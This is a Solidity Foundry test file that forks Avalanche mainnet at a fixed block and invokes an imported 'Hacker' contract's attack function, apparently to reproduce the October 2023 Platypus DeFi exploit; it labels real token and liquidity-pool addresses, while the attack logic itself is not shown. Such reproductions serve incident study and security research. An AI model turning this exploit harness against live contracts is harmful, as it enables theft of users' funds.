// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
// import { console2 } from "@dev/forge-std/src/console2.sol";
import { Hacker } from "@contracts/Hack/20231012-Platypus.sol";

/*
    forge test --match-path foundry/test/Hack/20231012-Platypus.t.sol -vvvvv
*/

contract Platypus_Attacker_20231012_Test is Test {
    // hacking attack address
    address private player = address(1);

    function setUp() public {
        // vm.deal(player, 10_000 ether);
        vm.createSelectFork({ urlOrAlias: "avalanche_mainnet", blockNumber: 36_341_514 });
        // vm.createSelectFork({ urlOrAlias: "avalanche_mainnet" });

        vm.label(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7, "Wrapped AVAX");
        vm.label(0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE, "Staked AVAX");

        vm.label(0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789, "LP-SAVAX");
        vm.label(0xC73eeD4494382093C6a7C284426A9a00f6C79939, "LP-AVAX");
    }

    function test_Exploit() public {
        vm.startPrank(player);
        Hacker hackInst = new Hacker();
        hackInst.attack();
    }
}
